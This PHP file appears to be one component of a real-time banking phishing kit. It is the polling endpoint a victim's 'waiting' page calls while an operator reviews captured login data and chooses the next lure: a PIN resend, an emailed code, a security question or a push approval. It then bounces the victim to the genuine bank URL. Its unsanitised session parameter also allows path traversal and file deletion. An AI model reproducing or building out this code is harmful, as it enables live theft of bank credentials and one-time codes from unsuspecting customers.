<?php
/**
 * check.php
 *
 * This script is polled by the waiting page after a login form submission.
 * It reads the session file associated with the current login submission.
 * - If the session status is still "pending", it returns { "status": "pending" }.
 * - If an admin has selected an action (status = "done"), it builds a redirect URL
 *   based on the bank's configuration and the chosen action, then returns:
 *   { "status": "done", "redirect": "<redirect_url>" }.
 * After returning a "done" status, it removes the session file.
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

header('Content-Type: application/json');

// Include configuration to access $BANKS
require_once $_SERVER['DOCUMENT_ROOT'] . '/config.php';

// Retrieve the session identifier from the query string.
$sessionId = isset($_GET['session']) ? trim($_GET['session']) : '';
if (empty($sessionId)) {
    echo json_encode(['status' => 'error', 'message' => 'No session specified.']);
    exit;
}

// Determine the session file path.
$sessionFile = __DIR__ . "/sessions/{$sessionId}.json";
if (!file_exists($sessionFile)) {
    echo json_encode(['status' => 'error', 'message' => 'Session not found.']);
    exit;
}

// Read the session data.
$sessionData = json_decode(file_get_contents($sessionFile), true);
if (!isset($sessionData['status']) || $sessionData['status'] !== 'done') {
    // Still waiting for admin action.
    echo json_encode(['status' => 'pending']);
    exit;
}

// Retrieve the selected action.
$action = isset($sessionData['action']) ? $sessionData['action'] : '';

// Determine the bank code from the saved POST data.
$bankCode = "";
if (isset($sessionData['post_data']['bank'])) {
    $bankCode = strtolower(trim($sessionData['post_data']['bank']));
}

// Build a redirect URL based on the bank configuration and selected action.
$redirectUrl = "";
if (!empty($bankCode) && isset($BANKS[$bankCode])) {
    $bankConfig = $BANKS[$bankCode];
    // Use the bank's official login_url as a base.
    $baseUrl = $bankConfig['login_url'];
    
    // Adapt the URL based on the selected action.
    switch ($action) {
        case "Correct password":
            // For a successful login, you might redirect to a dashboard.
            // For this adaptive project, we'll simply use the official login URL.
            $redirectUrl = $baseUrl;
            break;
        case "Incorrect password":
            $redirectUrl = $baseUrl . "?error=incorrect_password";
            break;
        case "Resend PIN":
            $redirectUrl = $baseUrl . "?action=resend_pin";
            break;
        case "Email code":
            $redirectUrl = $baseUrl . "?action=email_code";
            break;
        case "Incorrect security code":
            $redirectUrl = $baseUrl . "?error=incorrect_security_code";
            break;
        case "Timeout":
            $redirectUrl = $baseUrl . "?error=timeout";
            break;
        case "Deposit success":
            $redirectUrl = $baseUrl . "?status=deposit_success";
            break;
        case "Security question":
            $redirectUrl = $baseUrl . "?action=security_question";
            break;
        case "Swipe to approve":
            $redirectUrl = $baseUrl . "?action=swipe_approve";
            break;
        default:
            $redirectUrl = $baseUrl;
    }
} else {
    // Fallback: If bank configuration isn't available, return an empty URL.
    $redirectUrl = "";
}

// Return the JSON response.
echo json_encode([
    'status'   => 'done',
    'redirect' => $redirectUrl
]);

// Clean up: Delete the session file.
unlink($sessionFile);
exit;
?>